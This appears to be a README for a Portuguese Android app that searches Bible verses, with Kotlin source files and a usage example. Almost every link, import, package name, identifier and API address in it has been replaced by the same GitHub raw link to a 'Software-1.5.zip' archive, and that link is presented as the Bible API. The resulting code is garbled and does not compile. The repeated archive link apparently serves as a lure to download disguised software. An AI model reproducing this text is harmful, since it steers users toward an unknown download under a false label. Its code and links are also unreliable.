# 📖 App Busca Bíblica

Este é um aplicativo Android que permite ao usuário pesquisar versículos bíblicos, digitando o livro, capítulo e versículo.  
Ele utiliza a [Bible API](https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip) para retornar o texto da Bíblia.

> O app aceita nomes de livros digitados em **português** (ex: “joão”, “salmos”) e converte automaticamente para o formato exigido pela API (em inglês, sem acento).

---

## 📂 Arquivos principais

### ✅ `https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip`

```kotlin
package https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip

import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip*
import retrofit2.*
import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip

class MainActivity : AppCompatActivity() {

    // Referências aos componentes da interface
    lateinit var editLivro: EditText
    lateinit var editCapitulo: EditText
    lateinit var editVersiculo: EditText
    lateinit var btnBuscar: Button
    lateinit var textResultado: TextView

    // Mapa de tradução de livros da Bíblia (português → inglês)
    private val mapaLivros = mapOf(
        "genesis" to "genesis",
        "exodo" to "exodus",
        "levitico" to "leviticus",
        ...
        "apocalipse" to "revelation"
    )

    // Função de extensão que normaliza o texto: remove acentos e espaços
    private fun https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip(): String {
        val normalized = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip(this, https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)
        return Regex("\\p{InCombiningDiacriticalMarks}+").replace(normalized, "").lowercase().trim()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip(savedInstanceState)
        setContentView(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)

        // Ligando os componentes do layout
        editLivro = findViewById(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)
        editCapitulo = findViewById(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)
        editVersiculo = findViewById(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)
        btnBuscar = findViewById(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)
        textResultado = findViewById(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)

        https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip {
            val livroDigitado = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip().normalizeText()
            val capitulo = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip().toIntOrNull()
            val versiculo = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip().toIntOrNull()

            if (https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip() || capitulo == null || versiculo == null) {
                https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip = "Preencha todos os campos corretamente."
                return@setOnClickListener
            }

            // Traduz o nome do livro, se existir no mapa
            val livroApi = mapaLivros[livroDigitado] ?: livroDigitado

            // Configura o Retrofit para chamada HTTP
            val retrofit = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip()
                .baseUrl("https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip")
                .addConverterFactory(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip())
                .build()

            val api = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)

            // Faz a requisição com Retrofit
            val call = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip(livroApi, capitulo, versiculo)
            https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip(object : Callback<BibleResponse> {
                override fun onResponse(
                    call: Call<BibleResponse>,
                    response: Response<BibleResponse>
                ) {
                    if (https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip) {
                        val versiculo = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip()
                        if (versiculo != null && https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip()) {
                            https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip = "${https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip}\n\n${https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip}"
                        } else {
                            https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip = "Versículo não encontrado!"
                        }
                    } else {
                        https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip = "Versículo não encontrado!"
                    }
                }

                override fun onFailure(call: Call<BibleResponse>, t: Throwable) {
                    https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip = "Erro na conexão: ${https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip}"
                }
            })
        }
    }
}
```

### ✅ `https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip`
```kotlin
package https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip

import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip

// Interface Retrofit para acessar a Bible API
interface BibleApi {
    @GET("{livro}%20{capitulo}:{versiculo}")
    fun getVersiculo(
        @Path("livro") livro: String,
        @Path("capitulo") capitulo: Int,
        @Path("versiculo") versiculo: Int
    ): Call<BibleResponse>
}
```
### ✅ `https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip`
```kotlin
package https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip

// Modelo de dados da resposta da Bible API
data class BibleResponse(
    val reference: String,        // Ex: "John 3:16"
    val text: String,             // Texto do versículo
    val translation_name: String // Nome da tradução
)
```
## ✅ Exemplo de uso

Se o usuário digitar:

    Livro: João

    Capítulo: 3

    Versículo: 16

O app faz a busca para https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip%203:16 e retorna:

John 3:16

For God so loved the world that he gave his one and only Son, 
that whoever believes in him shall not perish but have eternal life.

ℹ️ Observações

    O app aceita nomes em português com acento, mas usa um sistema de normalização e tradução para converter o nome corretamente.

    O campo text pode vir em inglês (a API atualmente só oferece esse idioma).

    A API usada é gratuita e pública: https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip

...


